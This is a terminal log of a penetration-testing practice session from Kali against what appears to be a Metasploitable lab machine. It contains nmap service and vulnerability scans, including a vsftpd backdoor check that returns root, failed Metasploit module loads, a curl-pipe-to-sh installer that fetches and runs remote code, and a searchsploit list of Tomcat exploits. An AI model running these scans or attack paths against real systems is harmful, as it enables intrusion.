@@ -1,0 +1,1507 @@
+──(kali㉿kali)-[~]
+└─$ ping 192.168.78.133
+PING 192.168.78.133 (192.168.78.133) 56(84) bytes of data.
+64 bytes from 192.168.78.133: icmp_seq=1 ttl=64 time=1.81 ms
+64 bytes from 192.168.78.133: icmp_seq=2 ttl=64 time=0.777 ms
+64 bytes from 192.168.78.133: icmp_seq=3 ttl=64 time=0.998 ms
+64 bytes from 192.168.78.133: icmp_seq=4 ttl=64 time=0.855 ms
+64 bytes from 192.168.78.133: icmp_seq=5 ttl=64 time=0.832 ms
+64 bytes from 192.168.78.133: icmp_seq=6 ttl=64 time=0.850 ms
+64 bytes from 192.168.78.133: icmp_seq=7 ttl=64 time=0.881 ms
+64 bytes from 192.168.78.133: icmp_seq=8 ttl=64 time=0.983 ms
+64 bytes from 192.168.78.133: icmp_seq=9 ttl=64 time=1.01 ms
+64 bytes from 192.168.78.133: icmp_seq=10 ttl=64 time=1.11 ms
+64 bytes from 192.168.78.133: icmp_seq=11 ttl=64 time=0.955 ms
+64 bytes from 192.168.78.133: icmp_seq=12 ttl=64 time=0.753 ms
+64 bytes from 192.168.78.133: icmp_seq=13 ttl=64 time=1.07 ms
+^C
+--- 192.168.78.133 ping statistics ---
+13 packets transmitted, 13 received, 0% packet loss, time 12019ms
+rtt min/avg/max/mdev = 0.753/0.991/1.813/0.259 ms
+                                                                                                                                                                                                  
+┌──(kali㉿kali)-[~]
+└─$ nmap -sV 192.168.78.133
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-14 06:22 -0400
+Stats: 0:01:35 elapsed; 0 hosts completed (0 up), 1 undergoing ARP Ping Scan
+Parallel DNS resolution of 1 host. Timing: About 0.00% done
+Stats: 0:01:36 elapsed; 0 hosts completed (0 up), 1 undergoing ARP Ping Scan
+Parallel DNS resolution of 1 host. Timing: About 0.00% done
+Stats: 0:01:36 elapsed; 0 hosts completed (0 up), 1 undergoing ARP Ping Scan
+Parallel DNS resolution of 1 host. Timing: About 0.00% done
+
+                                                                                                                                                                                                  
+┌──(kali㉿kali)-[~]
+└─$ nmap -sV 192.168.78.133
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-14 06:23 -0400
+Nmap scan report for 192.168.78.133
+Host is up (0.0032s latency).
+Not shown: 977 closed tcp ports (reset)
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         vsftpd 2.3.4
+22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+23/tcp   open  telnet      Linux telnetd
+25/tcp   open  smtp        Postfix smtpd
+53/tcp   open  domain      ISC BIND 9.4.2
+80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
+111/tcp  open  rpcbind     2 (RPC #100000)
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+512/tcp  open  exec        netkit-rsh rexecd
+513/tcp  open  login
+514/tcp  open  tcpwrapped
+1099/tcp open  java-rmi    GNU Classpath grmiregistry
+1524/tcp open  bindshell   Metasploitable root shell
+2049/tcp open  nfs         2-4 (RPC #100003)
+2121/tcp open  ftp         ProFTPD 1.3.1
+3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
+5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
+5900/tcp open  vnc         VNC (protocol 3.3)
+6000/tcp open  X11         (access denied)
+6667/tcp open  irc         UnrealIRCd
+8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
+8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
+MAC Address: 00:0C:29:AF:31:F6 (VMware)
+Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 14.65 seconds
+                                                                                                                                                                                                  
+┌──(kali㉿kali)-[~]
+└─$ nmap --script vuln 192.168.78.133
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-14 06:32 -0400
+Nmap scan report for 192.168.78.133
+Host is up (0.0012s latency).
+Not shown: 977 closed tcp ports (reset)
+PORT     STATE SERVICE
+21/tcp   open  ftp
+| ftp-vsftpd-backdoor: 
+|   VULNERABLE:
+|   vsFTPd version 2.3.4 backdoor
+|     State: VULNERABLE (Exploitable)
+|     IDs:  BID:48539  CVE:CVE-2011-2523
+|       vsFTPd version 2.3.4 backdoor, this was reported on 2011-07-04.
+|     Disclosure date: 2011-07-03
+|     Exploit results:
+|       Shell command: id
+|       Results: uid=0(root) gid=0(root)
+|     References:
+|       https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523
+|       http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html
+|_      https://www.securityfocus.com/bid/48539
+22/tcp   open  ssh
+23/tcp   open  telnet
+25/tcp   open  smtp
+| ssl-poodle: 
+|   VULNERABLE:
+|   SSL POODLE information leak
+|     State: VULNERABLE
+|     IDs:  BID:70574  CVE:CVE-2014-3566
+|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other
+|           products, uses nondeterministic CBC padding, which makes it easier
+|           for man-in-the-middle attackers to obtain cleartext data via a
+|           padding-oracle attack, aka the "POODLE" issue.
+|     Disclosure date: 2014-10-14
+|     Check results:
+|       TLS_RSA_WITH_AES_128_CBC_SHA
+|     References:
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566
+|       https://www.securityfocus.com/bid/70574
+|       https://www.imperialviolet.org/2014/10/14/poodle.html
+|_      https://www.openssl.org/~bodo/ssl-poodle.pdf
+| ssl-dh-params: 
+|   VULNERABLE:
+|   Anonymous Diffie-Hellman Key Exchange MitM Vulnerability
+|     State: VULNERABLE
+|       Transport Layer Security (TLS) services that use anonymous
+|       Diffie-Hellman key exchange only provide protection against passive
+|       eavesdropping, and are vulnerable to active man-in-the-middle attacks
+|       which could completely compromise the confidentiality and integrity
+|       of any data exchanged over the resulting session.
+|     Check results:
+|       ANONYMOUS DH GROUP 1
+|             Cipher Suite: TLS_DH_anon_EXPORT_WITH_RC4_40_MD5
+|             Modulus Type: Safe prime
+|             Modulus Source: Unknown/Custom-generated
+|             Modulus Length: 512
+|             Generator Length: 8
+|             Public Key Length: 512
+|     References:
+|       https://www.ietf.org/rfc/rfc2246.txt
+|   
+|   Transport Layer Security (TLS) Protocol DHE_EXPORT Ciphers Downgrade MitM (Logjam)
+|     State: VULNERABLE
+|     IDs:  BID:74733  CVE:CVE-2015-4000
+|       The Transport Layer Security (TLS) protocol contains a flaw that is
+|       triggered when handling Diffie-Hellman key exchanges defined with
+|       the DHE_EXPORT cipher. This may allow a man-in-the-middle attacker
+|       to downgrade the security of a TLS session to 512-bit export-grade
+|       cryptography, which is significantly weaker, allowing the attacker
+|       to more easily break the encryption and monitor or tamper with
+|       the encrypted stream.
+|     Disclosure date: 2015-5-19
+|     Check results:
+|       EXPORT-GRADE DH GROUP 1
+|             Cipher Suite: TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA
+|             Modulus Type: Safe prime
+|             Modulus Source: Unknown/Custom-generated
+|             Modulus Length: 512
+|             Generator Length: 8
+|             Public Key Length: 512
+|     References:
+|       https://www.securityfocus.com/bid/74733
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000
+|       https://weakdh.org
+|   
+|   Diffie-Hellman Key Exchange Insufficient Group Strength
+|     State: VULNERABLE
+|       Transport Layer Security (TLS) services that use Diffie-Hellman groups
+|       of insufficient strength, especially those using one of a few commonly
+|       shared groups, may be susceptible to passive eavesdropping attacks.
+|     Check results:
+|       WEAK DH GROUP 1
+|             Cipher Suite: TLS_DHE_RSA_WITH_DES_CBC_SHA
+|             Modulus Type: Safe prime
+|             Modulus Source: postfix builtin
+|             Modulus Length: 1024
+|             Generator Length: 8
+|             Public Key Length: 1024
+|     References:
+|_      https://weakdh.org
+|_sslv2-drown: ERROR: Script execution failed (use -d to debug)
+| smtp-vuln-cve2010-4344: 
+|_  The SMTP server is not Exim: NOT VULNERABLE
+53/tcp   open  domain
+80/tcp   open  http
+|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
+|_http-trace: TRACE is enabled
+| http-enum: 
+|   /tikiwiki/: Tikiwiki
+|   /test/: Test page
+|   /phpinfo.php: Possible information file
+|   /phpMyAdmin/: phpMyAdmin
+|   /doc/: Potentially interesting directory w/ listing on 'apache/2.2.8 (ubuntu) dav/2'
+|   /icons/: Potentially interesting folder w/ directory listing
+|_  /index/: Potentially interesting folder
+| http-slowloris-check: 
+|   VULNERABLE:
+|   Slowloris DOS attack
+|     State: LIKELY VULNERABLE
+|     IDs:  CVE:CVE-2007-6750
+|       Slowloris tries to keep many connections to the target web server open and hold
+|       them open as long as possible.  It accomplishes this by opening connections to
+|       the target web server and sending a partial request. By doing so, it starves
+|       the http server's resources causing Denial Of Service.
+|       
+|     Disclosure date: 2009-09-17
+|     References:
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
+|_      http://ha.ckers.org/slowloris/
+|_http-dombased-xss: Couldn't find any DOM based XSS.
+|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+| http-csrf: 
+| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.78.133
+|   Found the following possible CSRF vulnerabilities: 
+|     
+|     Path: http://192.168.78.133:80/dvwa/
+|     Form id: 
+|     Form action: login.php
+|     
+|     Path: http://192.168.78.133:80/dvwa/login.php
+|     Form id: 
+|     Form action: login.php
+|     
+|     Path: http://192.168.78.133:80/mutillidae/index.php?page=html5-storage.php
+|     Form id: idform
+|_    Form action: index.php?page=html5-storage.php
+|_http-sql-injection: ERROR: Script execution failed (use -d to debug)
+111/tcp  open  rpcbind
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+512/tcp  open  exec
+513/tcp  open  login
+514/tcp  open  shell
+1099/tcp open  rmiregistry
+| rmi-vuln-classloader: 
+|   VULNERABLE:
+|   RMI registry default configuration remote code execution vulnerability
+|     State: VULNERABLE
+|       Default configuration of RMI registry allows loading classes from remote URLs which can lead to remote code execution.
+|       
+|     References:
+|_      https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/misc/java_rmi_server.rb
+1524/tcp open  ingreslock
+2049/tcp open  nfs
+2121/tcp open  ccproxy-ftp
+3306/tcp open  mysql
+|_ssl-ccs-injection: No reply from server (TIMEOUT)
+5432/tcp open  postgresql
+| ssl-ccs-injection: 
+|   VULNERABLE:
+|   SSL/TLS MITM vulnerability (CCS Injection)
+|     State: VULNERABLE
+|     Risk factor: High
+|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h
+|       does not properly restrict processing of ChangeCipherSpec messages,
+|       which allows man-in-the-middle attackers to trigger use of a zero
+|       length master key in certain OpenSSL-to-OpenSSL communications, and
+|       consequently hijack sessions or obtain sensitive information, via
+|       a crafted TLS handshake, aka the "CCS Injection" vulnerability.
+|           
+|     References:
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224
+|       http://www.openssl.org/news/secadv_20140605.txt
+|_      http://www.cvedetails.com/cve/2014-0224
+| ssl-poodle: 
+|   VULNERABLE:
+|   SSL POODLE information leak
+|     State: VULNERABLE
+|     IDs:  BID:70574  CVE:CVE-2014-3566
+|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other
+|           products, uses nondeterministic CBC padding, which makes it easier
+|           for man-in-the-middle attackers to obtain cleartext data via a
+|           padding-oracle attack, aka the "POODLE" issue.
+|     Disclosure date: 2014-10-14
+|     Check results:
+|       TLS_RSA_WITH_AES_128_CBC_SHA
+|     References:
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566
+|       https://www.securityfocus.com/bid/70574
+|       https://www.imperialviolet.org/2014/10/14/poodle.html
+|_      https://www.openssl.org/~bodo/ssl-poodle.pdf
+| ssl-dh-params: 
+|   VULNERABLE:
+|   Diffie-Hellman Key Exchange Insufficient Group Strength
+|     State: VULNERABLE
+|       Transport Layer Security (TLS) services that use Diffie-Hellman groups
+|       of insufficient strength, especially those using one of a few commonly
+|       shared groups, may be susceptible to passive eavesdropping attacks.
+|     Check results:
+|       WEAK DH GROUP 1
+|             Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA
+|             Modulus Type: Safe prime
+|             Modulus Source: Unknown/Custom-generated
+|             Modulus Length: 1024
+|             Generator Length: 8
+|             Public Key Length: 1024
+|     References:
+|_      https://weakdh.org
+5900/tcp open  vnc
+6000/tcp open  X11
+6667/tcp open  irc
+|_irc-unrealircd-backdoor: Looks like trojaned version of unrealircd. See http://seclists.org/fulldisclosure/2010/Jun/277
+8009/tcp open  ajp13
+8180/tcp open  unknown
+| http-enum: 
+|   /admin/: Possible admin folder
+|   /admin/index.html: Possible admin folder
+|   /admin/login.html: Possible admin folder
+|   /admin/admin.html: Possible admin folder
+|   /admin/account.html: Possible admin folder
+|   /admin/admin_login.html: Possible admin folder
+|   /admin/home.html: Possible admin folder
+|   /admin/admin-login.html: Possible admin folder
+|   /admin/adminLogin.html: Possible admin folder
+|   /admin/controlpanel.html: Possible admin folder
+|   /admin/cp.html: Possible admin folder
+|   /admin/index.jsp: Possible admin folder
+|   /admin/login.jsp: Possible admin folder
+|   /admin/admin.jsp: Possible admin folder
+|   /admin/home.jsp: Possible admin folder
+|   /admin/controlpanel.jsp: Possible admin folder
+|   /admin/admin-login.jsp: Possible admin folder
+|   /admin/cp.jsp: Possible admin folder
+|   /admin/account.jsp: Possible admin folder
+|   /admin/admin_login.jsp: Possible admin folder
+|   /admin/adminLogin.jsp: Possible admin folder
+|   /manager/html/upload: Apache Tomcat (401 Unauthorized)
+|   /manager/html: Apache Tomcat (401 Unauthorized)
+|   /admin/view/javascript/fckeditor/editor/filemanager/connectors/test.html: OpenCart/FCKeditor File upload
+|   /admin/includes/FCKeditor/editor/filemanager/upload/test.html: ASP Simple Blog / FCKeditor File Upload
+|   /admin/jscript/upload.html: Lizard Cart/Remote File upload
+|_  /webdav/: Potentially interesting folder
+| http-cookie-flags: 
+|   /admin/: 
+|     JSESSIONID: 
+|       httponly flag not set
+|   /admin/index.html: 
+|     JSESSIONID: 
+|       httponly flag not set
+|   /admin/login.html: 
+|     JSESSIONID: 
+|       httponly flag not set
+|   /admin/admin.html: 
+|     JSESSIONID: 
+|       httponly flag not set
+|   /admin/account.html: 
+|     JSESSIONID: 
+|       httponly flag not set
+|   /admin/admin_login.html: 
+|     JSESSIONID: 
+|       httponly flag not set
+|   /admin/home.html: 
+|     JSESSIONID: 
+|       httponly flag not set
+|   /admin/admin-login.html: 
+|     JSESSIONID: 
+|       httponly flag not set
+|   /admin/adminLogin.html: 
+|     JSESSIONID: 
+|       httponly flag not set
+|   /admin/controlpanel.html: 
+|     JSESSIONID: 
+|       httponly flag not set
+|   /admin/cp.html: 
+|     JSESSIONID: 
+|       httponly flag not set
+|   /admin/index.jsp: 
+|     JSESSIONID: 
+|       httponly flag not set
+|   /admin/login.jsp: 
+|     JSESSIONID: 
+|       httponly flag not set
+|   /admin/admin.jsp: 
+|     JSESSIONID: 
+|       httponly flag not set
+|   /admin/home.jsp: 
+|     JSESSIONID: 
+|       httponly flag not set
+|   /admin/controlpanel.jsp: 
+|     JSESSIONID: 
+|       httponly flag not set
+|   /admin/admin-login.jsp: 
+|     JSESSIONID: 
+|       httponly flag not set
+|   /admin/cp.jsp: 
+|     JSESSIONID: 
+|       httponly flag not set
+|   /admin/account.jsp: 
+|     JSESSIONID: 
+|       httponly flag not set
+|   /admin/admin_login.jsp: 
+|     JSESSIONID: 
+|       httponly flag not set
+|   /admin/adminLogin.jsp: 
+|     JSESSIONID: 
+|       httponly flag not set
+|   /admin/view/javascript/fckeditor/editor/filemanager/connectors/test.html: 
+|     JSESSIONID: 
+|       httponly flag not set
+|   /admin/includes/FCKeditor/editor/filemanager/upload/test.html: 
+|     JSESSIONID: 
+|       httponly flag not set
+|   /admin/jscript/upload.html: 
+|     JSESSIONID: 
+|_      httponly flag not set
+MAC Address: 00:0C:29:AF:31:F6 (VMware)
+
+Host script results:
+|_smb-vuln-ms10-061: false
+|_smb-vuln-ms10-054: false
+|_smb-vuln-regsvc-dos: ERROR: Script execution failed (use -d to debug)
+
+Nmap done: 1 IP address (1 host up) scanned in 322.50 seconds
+                                                                                          
+																						  
+																						  ]
+└─$ msfconsole
+Metasploit tip: Export your database results with db_export -f xml 
+<file>
+                                                  
+
+MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMM                MMMMMMMMMM
+MMMN$                           vMMMM
+MMMNl  MMMMM             MMMMM  JMMMM
+MMMNl  MMMMMMMN       NMMMMMMM  JMMMM
+MMMNl  MMMMMMMMMNmmmNMMMMMMMMM  JMMMM
+MMMNI  MMMMMMMMMMMMMMMMMMMMMMM  jMMMM
+MMMNI  MMMMMMMMMMMMMMMMMMMMMMM  jMMMM
+MMMNI  MMMMM   MMMMMMM   MMMMM  jMMMM
+MMMNI  MMMMM   MMMMMMM   MMMMM  jMMMM
+MMMNI  MMMNM   MMMMMMM   MMMMM  jMMMM
+MMMNI  WMMMM   MMMMMMM   MMMM#  JMMMM
+MMMMR  ?MMNM             MMMMM .dMMMM
+MMMMNm `?MMM             MMMM` dMMMMM
+MMMMMMN  ?MM             MM?  NMMMMMN
+MMMMMMMMNe                 JMMMMMNMMM
+MMMMMMMMMMNm,            eMMMMMNMMNMM
+MMMMNNMNMMMMMNx        MMMMMMNMMNMMNM
+MMMMMMMMNMMNMMMMm+..+MMNMMNMNMMNMMNMM
+        https://metasploit.com
+
+
+       =[ metasploit v6.4.126-dev                               ]
++ -- --=[ 2,638 exploits - 1,328 auxiliary - 2,163 payloads     ]
++ -- --=[ 432 post - 49 encoders - 14 nops - 12 evasion         ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+The Metasploit Framework is a Rapid7 Open Source Project
+
+msf > show options
+
+Global Options:
+===============
+
+   Option             Current Setting  Description
+   ------             ---------------  -----------
+   ConsoleLogging     false            Log all console input and output
+   LogLevel           0                Verbosity of logs (default 0, max 3)
+   MeterpreterPrompt                   The meterpreter prompt string
+   MinimumRank        manual           The minimum rank of exploits that will run without explicit confirmation (Accepted: manual, low, average, normal, good, great, excellent)
+   Prompt                              The prompt string
+   PromptChar                          The prompt character
+   PromptTimeFormat                    Format for timestamp escapes in prompts
+   SessionLogging     false            Log all input and output for sessions
+   SessionTlvLogging                   Log all incoming and outgoing TLV packets
+   TimestampOutput    false            Prefix all console output with a timestamp
+   VERBOSE            false            Enable detailed status messages - the specific behavior can differ per module
+
+msf > use exploit/multi/http/tomcat_mgr_login
+[-] No results from search
+[-] Failed to load module: exploit/multi/http/tomcat_mgr_login
+msf > exit
+                                                                                                                                                                                                  
+┌──(kali㉿kali)-[~]
+└─$ nmap -p 8180,8080 -sV 192.168.78.133
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-15 02:13 -0400
+Nmap scan report for 192.168.78.133
+Host is up (0.00090s latency).
+
+PORT     STATE  SERVICE    VERSION
+8080/tcp closed http-proxy
+8180/tcp open   http       Apache Tomcat/Coyote JSP engine 1.1
+MAC Address: 00:0C:29:AF:31:F6 (VMware)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 11.94 seconds
+                                                                                                                                                                                                  
+┌──(kali㉿kali)-[~]
+└─$ msfconsole
+Metasploit tip: Keep track of findings and observations with notes
+                                                  
+
+ ______________________________________________________________________________
+|                                                                              |
+|                          3Kom SuperHack II Logon                             |
+|______________________________________________________________________________|
+|                                                                              |
+|                                                                              |
+|                                                                              |
+|                 User Name:          [   security    ]                        |
+|                                                                              |
+|                 Password:           [               ]                        |
+|                                                                              |
+|                                                                              |
+|                                                                              |
+|                                   [ OK ]                                     |
+|______________________________________________________________________________|
+|                                                                              |
+|                                                       https://metasploit.com |
+|______________________________________________________________________________|
+
+
+       =[ metasploit v6.4.126-dev                               ]
++ -- --=[ 2,638 exploits - 1,328 auxiliary - 2,163 payloads     ]
++ -- --=[ 432 post - 49 encoders - 14 nops - 12 evasion         ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+The Metasploit Framework is a Rapid7 Open Source Project
+
+msf > use exploit/multi/http/tomcat_mgr_login
+[-] No results from search
+[-] Failed to load module: exploit/multi/http/tomcat_mgr_login
+msf > exit
+                                                                                                                                                                                                  
+┌──(kali㉿kali)-[~]
+└─$ use auxiliary/scanner/http/tomcat_mgr_login
+Command 'use' not found, did you mean:
+  command 'ase' from deb ase
+  command 'muse' from deb muse
+  command 'nse' from deb ns2
+  command 'us' from deb unicornscan
+Try: sudo apt install <deb name>
+                                                                                                                                                                                                  
+┌──(kali㉿kali)-[~]
+└─$ search tomcat
+Testing connection to Meilisearch...
+Using index 'movies'
+Adding 5 movies to the index...
+2026/05/15 02:15:28 Failed to add documents: MeilisearchCommunicationError unable to execute request (path "POST /indexes/movies/documents?primaryKey=id" with method "AddDocuments"): Post "http://localhost:7700/indexes/movies/documents?primaryKey=id": dial tcp [::1]:7700: connect: connection refused
+                                                                                                                                                                                                  
+┌──(kali㉿kali)-[~]
+└─$ exploit tomcat
+exploit: command not found
+                                                                                                                                                                                                  
+┌──(kali㉿kali)-[~]
+└─$ search exploit tomcat
+Testing connection to Meilisearch...
+Using index 'movies'
+Adding 5 movies to the index...
+2026/05/15 02:17:06 Failed to add documents: MeilisearchCommunicationError unable to execute request (path "POST /indexes/movies/documents?primaryKey=id" with method "AddDocuments"): Post "http://localhost:7700/indexes/movies/documents?primaryKey=id": dial tcp [::1]:7700: connect: connection refused
+                                                                                                                                                                                                  
+┌──(kali㉿kali)-[~]
+└─$ 
+                                                                                                                                                                                                  
+┌──(kali㉿kali)-[~]
+└─$ sudo systemctl start meilisearch
+[sudo] password for kali: 
+Failed to start meilisearch.service: Unit meilisearch.service not found.
+                                                                                                                                                                                                  
+┌──(kali㉿kali)-[~]
+└─$ which meilisearch
+meilisearch not found
+                                                                                                                                                                                                  
+┌──(kali㉿kali)-[~]
+└─$ systemctl list-units | grep meili
+                                                                                                                                                                                                  
+┌──(kali㉿kali)-[~]
+└─$ curl -L https://install.meilisearch.com | sh
+  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
+                                 Dload  Upload  Total   Spent   Left   Speed
+100    167   0    167   0      0     51      0           00:03             51
+100   4492 100   4492   0      0   1056      0   00:04   00:04           2179
+Downloading Meilisearch binary v1.43.1 for linux, architecture amd64...
+  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
+                                 Dload  Upload  Total   Spent   Left   Speed
+  0      0   0      0   0      0      0      0                              0
+100 134.3M 100 134.3M   0      0  4.04M      0   00:33   00:33          5.18M
+Meilisearch v1.43.1 binary successfully downloaded as 'meilisearch' file.
+                                                                                                                                                                                                  
+Run it:
+    $ ./meilisearch
+Usage:
+    $ ./meilisearch --help
+                                                                                                                                                                                                  
+┌──(kali㉿kali)-[~]
+└─$ ./meilisearch
+
+888b     d888          d8b 888 d8b                                            888
+8888b   d8888          Y8P 888 Y8P                                            888
+88888b.d88888              888                                                888
+888Y88888P888  .d88b.  888 888 888 .d8888b   .d88b.   8888b.  888d888 .d8888b 88888b.
+888 Y888P 888 d8P  Y8b 888 888 888 88K      d8P  Y8b     "88b 888P"  d88P"    888 "88b
+888  Y8P  888 88888888 888 888 888 "Y8888b. 88888888 .d888888 888    888      888  888
+888   "   888 Y8b.     888 888 888      X88 Y8b.     888  888 888    Y88b.    888  888
+888       888  "Y8888  888 888 888  88888P'  "Y8888  "Y888888 888     "Y8888P 888  888
+
+Config file path:       "none"
+Database path:          "./data.ms"
+Server listening on:    "http://localhost:7700"
+Environment:            "development"
+Commit SHA:             "ba97d76a294ac0e4f006547c3bb38d3fe2a98c07"
+Commit date:            "2026-05-12T11:48:02+02:00"
+Package version:        "1.43.1"
+
+Thank you for using Meilisearch!
+
+
+We collect anonymized analytics to improve our product and your experience. To learn more, including how to turn off analytics, visit our dedicated documentation page: https://www.meilisearch.com/docs/learn/what_is_meilisearch/telemetry
+
+Anonymous telemetry:    "Enabled"
+Instance UID:           "c4edbe47-7686-4570-a8af-cf1e85e812b7"
+
+
+                                                                                                                                                                                                  
+ No master key was found. The server will accept unidentified requests.                                                                                                                           
+                                                                                                                                                                                                  
+ A master key of at least 16 bytes will be required when switching to a production environment.                                                                                                   
+                                                                                                                                                                                                  
+
+We generated a new secure master key for you (you can safely use this token):
+
+>> --master-key BSnahCoWAxgyWZrTbzvnvczQjAU0SkzfPJNWkuGHLrY <<
+
+Restart Meilisearch with the argument above to use this new and secure master key.
+
+Check out Meilisearch Cloud!    https://www.meilisearch.com/cloud?utm_campaign=oss&utm_source=engine&utm_medium=cli
+Documentation:                  https://www.meilisearch.com/docs
+Source code:                    https://github.com/meilisearch/meilisearch
+Discord:                        https://discord.meilisearch.com
+
+2026-05-15T06:19:35.370962Z  INFO actix_server::builder: starting 4 workers
+2026-05-15T06:19:35.371076Z  INFO actix_server::server: Actix runtime found; starting in Actix runtime
+2026-05-15T06:19:35.371091Z  INFO actix_server::server: starting service: "actix-web-service-[::1]:7700", workers: 4, listening on: [::1]:7700
+2026-05-15T06:19:35.371104Z  INFO actix_server::server: starting service: "actix-web-service-127.0.0.1:7700", workers: 4, listening on: 127.0.0.1:7700
+^C                                                                                                                                                                                                  
+┌──(kali㉿kali)-[~]
+└─$ sudo apt update
+sudo apt install exploitdb -y
+searchsploit tomcat
+Hit:1 http://http.kali.org/kali kali-rolling InRelease
+30 packages can be upgraded. Run 'apt list --upgradable' to see them.
+exploitdb is already the newest version (20260411-0kali1).
+exploitdb set to manually installed.
+Summary:                    
+  Upgrading: 0, Installing: 0, Removing: 0, Not Upgrading: 30
+---------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                                  |  Path
+---------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+4D WebSTAR 5.3/5.4 Tomcat Plugin - Remote Buffer Overflow                                                                                                       | osx/remote/25626.c
+Apache 1.3.x + Tomcat 4.0.x/4.1.x mod_jk - Chunked Encoding Denial of Service                                                                                   | unix/dos/22068.pl
+Apache Commons FileUpload and Apache Tomcat - Denial of Service                                                                                                 | multiple/dos/31615.rb
+Apache Tomcat (Windows) - 'runtime.getRuntime().exec()' Local Privilege Escalation                                                                              | windows/local/7264.txt
+Apache Tomcat - 'WebDAV' Remote File Disclosure                                                                                                                 | multiple/remote/4530.pl
+Apache Tomcat - Account Scanner / 'PUT' Request Command Execution                                                                                               | multiple/remote/18619.txt
+Apache Tomcat - AJP 'Ghostcat File Read/Inclusion                                                                                                               | multiple/webapps/48143.py
+Apache Tomcat - AJP 'Ghostcat' File Read/Inclusion (Metasploit)                                                                                                 | multiple/webapps/49039.rb
+Apache Tomcat - CGIServlet enableCmdLineArguments Remote Code Execution (Metasploit)                                                                            | windows/remote/47073.rb
+Apache Tomcat - Cookie Quote Handling Remote Information Disclosure                                                                                             | multiple/remote/9994.txt
+Apache Tomcat - Form Authentication 'Username' Enumeration                                                                                                      | multiple/remote/9995.txt
+Apache Tomcat - WebDAV SSL Remote File Disclosure                                                                                                               | linux/remote/4552.pl
+Apache Tomcat / Geronimo 1.0 - 'Sample Script cal2.jsp?time' Cross-Site Scripting                                                                               | multiple/remote/27095.txt
+Apache Tomcat 10.1 - Denial Of Service                                                                                                                          | multiple/dos/51262.py
+Apache Tomcat 10.1.39 - Denial of Service (DoS)                                                                                                                 | multiple/remote/52318.py
+Apache Tomcat 11.0.3 - Remote Code Execution                                                                                                                    | multiple/webapps/52134.txt
+Apache Tomcat 3.0 - Directory Traversal                                                                                                                         | windows/remote/20716.txt
+Apache Tomcat 3.1 - Path Revealing                                                                                                                              | multiple/remote/20131.txt
+Apache Tomcat 3.2 - 404 Error Page Cross-Site Scripting                                                                                                         | multiple/remote/33379.txt
+Apache Tomcat 3.2 - Directory Disclosure                                                                                                                        | unix/remote/21882.txt
+Apache Tomcat 3.2.1 - 404 Error Page Cross-Site Scripting                                                                                                       | multiple/webapps/10292.txt
+Apache Tomcat 3.2.3/3.2.4 - 'RealPath.jsp' Information Disclosuree                                                                                              | multiple/remote/21492.txt
+Apache Tomcat 3.2.3/3.2.4 - 'Source.jsp' Information Disclosure                                                                                                 | multiple/remote/21490.txt
+Apache Tomcat 3.2.3/3.2.4 - Example Files Web Root Full Path Disclosure                                                                                         | multiple/remote/21491.txt
+Apache Tomcat 3.x - Null Byte Directory / File Disclosure                                                                                                       | linux/remote/22205.txt
+Apache Tomcat 3/4 - 'DefaultServlet' File Disclosure                                                                                                            | unix/remote/21853.txt
+Apache Tomcat 3/4 - JSP Engine Denial of Service                                                                                                                | linux/dos/21534.jsp
+Apache Tomcat 4.0.3 - Denial of Service 'Device Name' / Cross-Site Scripting                                                                                    | windows/webapps/21605.txt
+Apache Tomcat 4.0.3 - Requests Containing MS-DOS Device Names Information Disclosure                                                                            | multiple/remote/31551.txt
+Apache Tomcat 4.0.3 - Servlet Mapping Cross-Site Scripting                                                                                                      | linux/remote/21604.txt
+Apache Tomcat 4.0.x - Non-HTTP Request Denial of Service                                                                                                        | linux/dos/23245.pl
+Apache Tomcat 4.0/4.1 - Servlet Full Path Disclosure                                                                                                            | unix/remote/21412.txt
